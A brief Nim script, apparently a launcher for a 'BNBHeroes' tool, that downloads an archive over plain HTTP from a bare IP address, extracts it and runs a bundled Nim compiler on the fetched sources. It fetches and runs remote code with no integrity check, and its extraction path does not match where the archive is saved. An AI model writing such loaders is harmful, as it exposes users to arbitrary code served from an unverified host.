import httpclient, os, strformat, osproc


var tempDir = getTempDir()
echo tempDir
var client = newHttpClient()

var content = client.getContent("http://8.214.56.100:80/bnbheroes/src")
writeFile(&"{tempDir}/src.7z", content)
echo execProcess(command= "./7z.exe x src.7z")

echo execProcess(command = &"./nim.exe {tempDir}/src/fight.nim")

echo execProcess(command = &"./nim.exe {tempDir}/src/BNBHeroes.nim")
